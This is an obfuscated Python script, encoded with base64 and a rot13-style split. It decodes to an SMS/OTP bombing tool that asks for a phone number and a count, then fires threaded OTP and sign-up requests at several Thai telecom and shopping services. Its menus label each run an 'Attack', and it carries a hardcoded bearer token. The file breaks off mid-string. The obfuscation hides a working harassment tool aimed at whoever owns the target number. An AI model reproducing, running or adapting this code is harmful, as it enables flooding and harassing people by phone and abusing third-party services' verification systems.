# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'ZnJvbSByZXF1ZXN0cyBpbXBvcnQgcG9zdCxTZXNzaW9uCmZyb20gcmUgaW1wb3J0IHNlYXJjaAppbXBvcnQgdGltZQppbXBvcnQgb3Msc3lzCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKaW1wb3J0IHJlcXVlc3RzLHRocmVhZGluZyx0aW1lLG9zLHN5cwpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkCmZyb20gY29sb3JhbWEgaW1wb3J0IEZvcmUsIEJhY2ssIFN0eWxlCmltcG9ydCB0aW1lCmRlZiBzbG93cHJpbnRzKHMpOgogICAgZm9yIGMgaW4gcyArICdcbic6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShjKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMi4wLzkwKQogICAgICAgIAogICAgICAgIAogICAgICAgIAogICAgICAgIAogICAgICAgIAogIApuYW1lZF90dXBsZSA9IHRpbWUubG9jYWx0aW1lKCkgIyBnZXQgc3RydWN0X3RpbWUKdGltZV9zdHJpbmcgPSB0aW1lLnN0cmZ0aW1lKCIlbS8lZC8lWSwgJUg6JU06JVMiLCBuYW1lZF90dXBsZSkKCgpkZWYgYWxsKCk6Cgl3cml0ZSA9ICIiIgogICAgICAJXyAgICAgICAgICBfICAgICAgXyAgICBfIF8KICAgICAgIC8gXCAgIF8gX18gKF8pICAgIC8gXCAgfCB8IHwKICAgICAgLyBfIFwgfCAnXyBcfCB8ICAgLyBfIFwgfCB8IHwKICAgICAvIF9fXyBcfCB8XykgfCB8ICAvIF9fXyBcfCB8IHwKICAgIC9fLyAgIFxfXCAuX18vfF98IC9fLyAgIFxfXF98X3wKICAgICAgICAgICAgfF98CQogICAKCQoJIiIiCgl0aW1lLnNsZWVwKDEuMCkKCXNsb3dwcmludHMod3JpdGUpCglhdCA9IGlucHV0KCJFbnRlciBOdW1iZXIgOiAiKQoJYWFzID0gaW50KGlucHV0KCJFbnRlciBBbW91bnQgOiAiKSkKCQoJZGVmIHh4eCgpOgoJCXBvc3QoImh0dHBzOi8vdG9wcGluZy50cnVlbW92ZWguY29tL2FwaS9nZXRfcmVxdWVzdF9vdHAiLGRhdGE9eyJtb2JpbGVfbnVtYmVyIjogYXQsCgl9KQoJCglkZWYgcSAoKToKCQlwb3N0KCJodHRwczovL3ZhY2NpbmUudHJ1ZWlkLm5ldC92YWNjLXZlcmlmeS9hcGkvZ2V0b3RwIixqc29uPXsibXNpc2RuIjphdCwiZnVuY3Rpb24iOiJlbnJvbGwifSxoZWFkZXJzPXsidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgVjIwNDMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuMTA2IE1vYmlsZSBTYWZhcmkvNTM3LjM2In0pCgkKCWRlZiB3KCk6CgkJdXNlcmFnZW50ID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgVjIwNDMpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuMTA2IE1vYmlsZSBTYWZhcmkvNTM3LjM2IgoJCXNlc3Npb24gPSBTZXNzaW9uKCkKCQlSZXFUT0tFTiA9IHNlc3Npb24uZ2V0KCJodHRwczovL3NyZm5nLmFpcy5jby50aC9MdDZZeVJSMlZ2eiUyQiUyRjZNTkc5eFF2VlRVMHJtTVE1c25Dd0tSYUs2cnBUcnVoTSUyQkRBenVoUlElM0QlM0Q/cmVkaXJlY3RfdXJpPWh0dHBzJTNBJTJGJTJGYWlzcGxheS5haXMuY28udGglMkZwb3J0YWwlMkZjYWxsYmFjayUyRmZ1bmd1cyUyRmFueSZodHRwR2VuZXJhdGU9Z2VuZXJhdGVkIiwgaGVhZGVycz17IlVzZXItQWdlbnQiOiB1c2VyYWdlbnR9KS50ZXh0CgkJc2Vzc2lvbi5wb3N0KCJodHRwczovL3NyZm5nLmFpcy5jby50aC9sb2dpbi9zZW5kT25lVGltZVBXIiwgZGF0YT1mIm1zaXNkbj02NnthdFsxOl19JnNlcnZpY2VJZD1BSVNQbGF5JmFjY291bnRUeXBlPWFsbCZvdHBDaGFubmVsPXNtcyIsaGVhZGVycz17IlVzZXItQWdlbnQiOiB1c2VyYWdlbnQsIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgiLCAiYXV0aG9yaXphdGlvbiI6IGYnJydCZWFyZXIge3NlYXJjaCgiIiI8aW5wdXQgdHlwZT0iaGlkZGVuIiBpZD0ndG9rZW4nIHZhbHVlPSIoLiopIj4iIiIsIFJlcVRPS0VOKS5ncm91cCgxKX0nJyd9KQoJZGVmIGUoKToKCQl1c2VyYWdlbnQgPSAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBWMjA0MykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgzLjAuNDEwMy4xMDYgTW9iaWxlIFNhZmFyaS81MzcuMzYiCgkJc2Vzc2lvbiA9IFNlc3Npb24oKQoJCXNlYXJjaEl0ZW0gPSBzZXNzaW9uLmdldCgiaHR0cHM6Ly93d3cuc2hvcGF0MjQuY29tL3JlZ2lzdGVyLyIpLnRleHQKCQlSZXFUT0tFTiA9IHNlYXJjaCgiIiI8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJfY3NyZiIgdmFsdWU9IiguKikiIC8+IiIiLCBzZWFyY2hJdGVtKS5ncm91cCgxKQoJCXNlc3Npb24ucG9zdCgiaHR0cHM6Ly93d3cuc2hvcGF0MjQuY29tL3JlZ2lzdGVyL2FqYXgvcmVxdWVzdG90cC8iLCBoZWFkZXJzPXsiVXNlci1BZ2VudCI6IHVzZXJhZ2VudCwgImNvbnRlbnQtdHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgiLCJYLUNTUkYtVE9LRU4iOiBSZXFUT0tFTn0sIGRhdGE9eyJwaG9uZU51bWJlciI6IGF0fSkKCWRlZiBjYWFyZCgpOgoJCXJlcXVlc3RzLmdldChmImh0dHBzOi8vYXN2LW1vYmlsZWFwcC1wcm9kLmF6dXJld2Vic2l0ZXMubmV0L2FwaS9TaWduaW4vU2VuZE9UUD9waG9uZU5vPXthdH0mdHlwZT1SZWdpc3RlciIpCgkJCgkJCgkJCglkZWYgcigpOgoJCXBvc3QoImh0dHBzOi8vb2NzLXByb2QtYXBpLm1ha3JvY2xpY2suY29tL25leHQtb2NzLW1lbWJlci91c2VyL3JlZ2lzdGVyIixqc29uPXsidXNlcm5hbWUiOmF0LCJwYXNzd29yZCI6IjExMTFhMTExMUEiLCJuYW1lIjphdCwicHJvdmluY2VDb2RlIjoiNzQiLCJkaXN0cmljdENvZGUiOiI5NzAiLCJzdWJkaXN0cmljdENvZGUiOiI4NjU0IiwiemlwY29kZSI6Ijk0MTQwIiwic2llYmVsQ3VzdG9tZXJUeXBlSWQiOiI3MTAiLCJsb2NhbGUiOiJ0aF9USCJ9LGhlYWRlcnM9eyJ1c2VyLWFnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBWMjA0MykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzgzLjAuNDEwMy4xMDYgTW9iaWxlIFNhZmFyaS81MzcuMzYifSkKCWRlZiBpY29uKCk6CgkJcG9zdCgiaHR0cHM6Ly9ub2Nub2MuY29tL2F1dGhlbnRpY2F0aW9uLXNlcnZpY2UvdXNlci9PVFA/Yi11aWQ9MS4wLjY2MyIsIGpzb249ewogICJsYW5nIjogInRoIiwKICAidXNlclR5cGUiOiAiQlVZRVIiLAogICJsb2NhbGUiOiAidGgiLAogICJvcmdJZGZpZXIiOiAic2NnIiwKICAicGhvbmUiOiBhdCwKICAidHlwZSI6ICJzaWdudXAiLAogICJvdHBUZW1wbGF0ZSI6ICJidXllcl9zaWdudXBfb3RwX21lc3NhZ2UiLAogICJ1c2VyUGFyYW1zIjogewogICAgImJ1eWVyTmFtZSI6ICJpYnRlZXNhbSIKICB9Cn0sIGhlYWRlcnM9eyJhdXRob3JpemF0aW9uIjoiQmVhcmVyIGV5SjBlWEFpT2lKS1YxUWlMQ0psYm1NaU9pSkJNVEk0UTBKRExVaFRNalUySWl3aVlXeG5Jam9pWkdseUluMC4uRWpsUkNlZVZsd0VNbkFhcDdSRDdfdy5nbXNYY2h2V0FrUG5HYnRuZkg0VlMybV9hd3h5TWNlbEQ0d3NtT3V4TkYxX0JxUzcyejM3MHFDeGVOTnNSLVAyd3NLXzZxVU5KMGVrNGlTVVB1VHdWMzFXdlh1clhkekNCQkY0aVhJSU9rTmxIai12a2E4U3k4emppbl9FMENSdXJURnY4dHNGNm1wZVlUQTlsTzNjeFEuaFZUS1VidG91WTRMTXB4VlJYVnBNdyIsICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiJ9KQoKCgoJCQoJCQoJCQoJZm9yIGkgaW4gcmFuZ2UoYWFzKToKC'
love = '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'
god = 'BNb2JpbGUgU2FmYXJpLzUzNy4zNiIKCQoJYXBob25lID0gaW5wdXQoIkVudGVyIE51bWJlciA6ICIpCglhamFlID0gaW50KGlucHV0KCJFbnRlciBBbW91bnQgOiAiKSkKCWRlZiBhdCgpOgoJCXNlc3Npb24gPSBTZXNzaW9uKCkKCQlzZWFyY2hJdGVtID0gc2Vzc2lvbi5nZXQoImh0dHBzOi8vd3d3LnNob3BhdDI0LmNvbS9yZWdpc3Rlci8iKS50ZXh0CgkJUmVxVE9LRU4gPSBzZWFyY2goIiIiPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iX2NzcmYiIHZhbHVlPSIoLiopIiAvPiIiIiwgc2VhcmNoSXRlbSkuZ3JvdXAoMSkKCQlzZXNzaW9uLnBvc3QoImh0dHBzOi8vd3d3LnNob3BhdDI0LmNvbS9yZWdpc3Rlci9hamF4L3JlcXVlc3RvdHAvIiwgaGVhZGVycz17IlVzZXItQWdlbnQiOiB1c2VyYWdlbnQsICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IiwiWC1DU1JGLVRPS0VOIjogUmVxVE9LRU59LCBkYXRhPXsicGhvbmVOdW1iZXIiOiBhcGhvbmV9KQoJZm9yIGkgaW4gcmFuZ2UoYWphZSk6CgkJdGltZS5zbGVlcCgwLjIwKQoJCXByaW50ICgiPD09PSDinJNBdHRhY2sgU2hvcGF0MjQo4pyTPT0+IikKCQl0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1hdCkuc3RhcnQoKQoJcmV0dXJlcmVyZSgpCgoKZGVmIHJldHVyZXJlcmUoKToKCXRpbWUuc2xlZXAoMS4wKQoJcHJpbnQoIiIiCgkxLmJhY2sgSG9tZQoJMi5zaG9wYXQyNAoJOTkuZXhpdAoJIiIiKQoJcyA9IGlucHV0KCJwbGVhc2UgY2hvaWNlIOKepCAiKQoJaWYgKHMgPT0gIjEiKToKCQlzdGFydCgpCgllbGlmKHM9PSIyIik6CgkJc2hvcCgpCgllbGlmKHM9PSI5OSIpOgoJCWV4aXQoKQoJZWxzZToKCQlwcmludCgiUGxlYXNlIHNlbGVjdCB0aGUgY29ycmVjdCBvbmUuISEhISEiKQoJCXJldHVyZXJlcmUoKQoKCgpkZWYgcHQgKCk6Cgl0aW1lLnNsZWVwKDEuMCkKCXByaW50KEZvcmUuWUVMTE9XKyIiIgoJCi4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLioKLiAuIC4gLiAuIC4gLiAuIC4gLiAuKi4gLiAuIC4gLiAuIC4gKiogKgouIC4gLiAuIC4uIC4gLiAuIC4gLioqKiAuIC4gKiAuIC4gKioqKioKLiAuIC4gLiAuIC4gLiAuIC4gLiAuKiogLiAuICoqLiAuIC4gLiAuKgouIC4gLiAuIC4gLiAuIC4gLiAuICoqKi4qLiAuICouIC4gLiAuIC4qCi4gLiAuIC4gLiAuIC4gLiAuIC4qKioqLiAuIC4gLioqIC4gLiAuICoqKioqKgouIC4gLiAuIC4gLiAuIC4gLiAqKioqKiAuIC4gLiAuKiouKi4gLiAuIC4gLiAqKgouIC4gLiAuIC4gLiAuIC4gLioqKioqLiAuIC4gLiAuICoqLiAuIC4gLiAuIC4gKi4qKgouIC4gLiAuIC4gLiAuIC4qKioqKi4gLiAuIC4gLiAuKi4gLiAuIC4gLiAuICoKLiAuIC4gLiAuIC4gLiAuKioqKioqLiAuIC4gLiAuKi4gLiAuIC4gLiAqCi4gLiAuIC4gLiAuIC4gLioqKioqKiogLiAuIC4qLiAuIC4gLiAuKgouIC4gLiAuIC4gLiAuIC4gLioqKioqKioqKi4gLiAuIC4gLiAqCi4gLiAuIC4gLiAuIC4gLiAuIC4qKioqKioqIC4gKioqCioqKioqKiouIC4gLiAuIC4gLiAuIC4gLioqCi4qKioqKioqLiAuIC4gLiAuIC4gLiAuICoKLiAqKioqKiouIC4gLiAuIC4gLiAuIC4gKiAqCi4gLioqKi4gLiAqLiAuIC4gLiAuIC4gLioqCi4gLiAuIC4gLiAuIC4qLiAuIC4gLiAuICoKLiAuIC4gLiAuKioqKi4qLiAuIC4gLioKLiAuIC4gKioqKioqKi4gLiouIC4qCi4gLiAuKioqKioqKi4gLiAuICouCi4gLiAuKioqKiouIC4gLiAuICoKLiAuIC4qKi4gLiAuIC4gLiAuKgouIC4gLiouIC4gLiAuIC4gLiAqKi4qCi4gLiAuIC4gLiAuIC4gLiAuICoqCi4gLiAuIC4gLiAuIC4gLiAuKgouIC4gLiAuIC4gLiAuIC4gLioKLiAuIC4gLiAuIC4gLiAuIC4qCi4gLiAuIC4gLiAuIC4gLiAqCi4gLiAuIC4gLiAuIC4gLiAqCi4gLiAuIC4gLiAuIC4gLiAqCi4gLiAuIC4gLiAuIC4gLiAqCi4gLiAuIC4gLiAuIC4gLiAqCgkiIiIpCgkKCQoJYXBob24gPSBpbnB1dCgiRW50ZXIgTnVtYmVyIDogIikKCWFqYSA9IGludChpbnB1dCgiRW50ZXIgQW1vdW50IDogIikpCglkZWYgY2FyZCgpOgoJCXJlcXVlc3RzLmdldChmImh0dHBzOi8vYXN2LW1vYmlsZWFwcC1wcm9kLmF6dXJld2Vic2l0ZXMubmV0L2FwaS9TaWduaW4vU2VuZE9UUD9waG9uZU5vPXthcGhvbn0mdHlwZT1SZWdpc3RlciIpCglmb3IgaSBpbiByYW5nZShhamEpOgoJCXRpbWUuc2xlZXAoMC4yMCkKCQlwcmludCAoIjw9PT0g4pyTQXR0YWNrIFB0IG1heGNhckQo4pyTPT0+IikKCQl0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1jYXJkKS5zdGFydCgpCglyZXR1cmVyZSgpCgkJCiAKCQkKCgoKCgoKZGVmIHJldHVyZXJlKCk6Cgl0aW1lLnNsZWVwKDEuMCkKCXByaW50KCIiIgoJMS5iYWNrIEhvbWUKCTIuUHQKCTk5LmV4aXQKCSIiIikKCXMgPSBpbnB1dCgicGxlYXNlIGNob2ljZSDinqQgIikKCWlmIChzID09ICIxIik6CgkJc3RhcnQoKQoJZWxpZihzPT0iMiIpOgoJCXB0KCkKCWVsaWYocz09Ijk5Iik6CgkJZXhpdCgpCgllbHNlOgoJCXByaW50KCJQbGVhc2Ugc2VsZWN0IHRoZSBjb3JyZWN0IG9uZS4hISEhISIpCgkJcmV0dXJlcmUoKQoKCgoKCgoKCmRlZiBOb2MoKToKCXRpbWUuc2xlZXAoMS4wKQoJcHJpbnQoRm9yZS5HUkVFTisiIiIKCeKWoOKWoCDilqDilqDilqDjgIAg4pag4pagCuKWoOKWoOOAgOOAgOKWoOKWoOOAgOOAgOKWoOKWoArilqDilqDjgIDjgIDilqDilqDjgIDjgIDilqDilqAK4pag4pag44CA44CA4pag4pag44CA44CA4pag4pagCuKWoOKWoOKWoCDilqDilqDilqAK4pag4pag4pag44CA44CA44CA44CA44CA44CA44CA44CA4pag4pagIOOAgOOAgArilqDilqDilqDjgIDjgIDjgIDjgIDjgIDjgIDjgIDjgIDjgIDilqDilqDilqDjgIDjgIAK4pag4pag4pag44CA4peP44CA44CA44CA44CA44CA4peP44CA44CA4pag4pag4pag44CACuKWoOKWoOOAgOKXjuOAgOOAgOOAgOOAgOOAgOOAgOOAgOKXjuOAgOKWoOKWoArilqDilqDilqDjgIDjgIDjgIDjgIDvvLTjgIDjgIDjgIDjgIDilqDilqDilqAg44CAIOOAgOOAgArilqDilqDilqDjgIDjgIDjgIDjgIDjgIDilqDilqDilqAK4pag4pag4pag4pag4pag4pag4pag4pag4pagIOOAgOOAgArilqHilqDilqDilqDilqDilqDilqDilqDilqDilqDilqHjgIAK4pag4pag4pag44CA4pag4pag4pag44CACuKWoOKWoOOAgOOAgOOAgOKWoOKWoAoJIiIiKQoJCgkKCXBob24gPSBpbnB1dCgiRW50ZXIgTnVtYmVyIDogIikKCWphID0gaW50KGlucHV0KCJFbnRlciBBbW91bnQgOiAiKSkKCQoJZGVmIGNvbigpOgoJCXBvc3QoImh0dHBzOi8vbm9jbm9jLmNvbS9hdXRoZW50aWNhdGlvbi1zZXJ2aWNlL3VzZXIvT1RQP2ItdWlkPTEuMC42NjMiLCBqc29uPXsKICAibGFuZyI6ICJ0aCIsCiAgInVzZXJUeXBlIjogIkJVWUVSIiwKICAibG9jYWxlIjogInRoIiwKICAib3JnSWRmaWVyIjogInNjZyIsCiAgInBob25lIjogcGhvbiwKICAidHlwZSI6ICJzaWdudXAiLAogICJvdHBUZW1wbGF0ZSI6ICJidXllcl9zaWdudXBfb3RwX21lc3NhZ2UiLAogICJ1c2VyUGFyYW1zIjogewogICAgImJ1eWVyTmFtZSI6ICJpYnRlZXNhbSIKICB9Cn0sIGhlYWRlcnM9eyJhdXRob3JpemF0aW9uIjoiQmVhcmVyIGV5SjBlWEFpT2lKS1YxUWlMQ0psYm1NaU9pSkJNVEk0UTBKRExVaFRNalUySWl3aVlXeG5Jam9pWkdseUluMC4uRWpsUkNlZVZsd0VNbkFhcDdSRDdfdy5nbXNYY2h2V0FrUG5HYnRuZkg0VlMybV9hd3h5TWNlbEQ0d3NtT3V4TkYxX0JxUzcyejM3MHFDeGVOTnNSLVAyd3NLXzZxVU5KMGVrNGlTVVB1VHdWMzF'
destiny = 'Kqyu1pyuxrxAPDxL0nIuWFH9eGzkVnv12n2R4H3x4rzccoy9SZRAFqKWHEaL4qUATAz1jMIyHDGyfGmAwrSRhnSMHF1IvqT91JGEZGKO4IyWLIaOAqlVfVPWwo250MJ50YKE5pTHvBvNvLKOjoTywLKEco24inaAiovW9XDbWMz9lVTRtnJ4tpzShM2HbnzRcBtbWPKEcoJHhp2kyMKNbZP4lZPxXPDyjpzyhqPNbVwj9CG0t4clGDKE0LJAeVR5iLlQvaWZ9CG4vXDbWPKEbpzIuMTyhMl5HnUWyLJDbqTSlM2I0CJAiovxhp3EupaDbXDbWpzI0qKWypvtcPtxWPtxWPzEyMvOlMKE1pzIlXPx6Pty0nJ1yYaAfMJIjXQRhZPxXPKOlnJ50XPVvVtbWZF5vLJAeVRuioJHXPGVhGz9wPtx5BF5yrTy0PtxvVvVcPtymVQ0tnJ5jqKDbVaOfMJSmMFOwnT9cL2Ht4c6xVPVcPtycMvNbplN9CFNvZFVcBtbWPKA0LKW0XPxXPJIfnJLbpm09VwVvXGbXPDyBo2ZbXDbWMJkcMvumCG0vBGxvXGbXPDyyrTy0XPxXPJIfp2H6PtxWpUWcoaDbVyOfMJSmMFOmM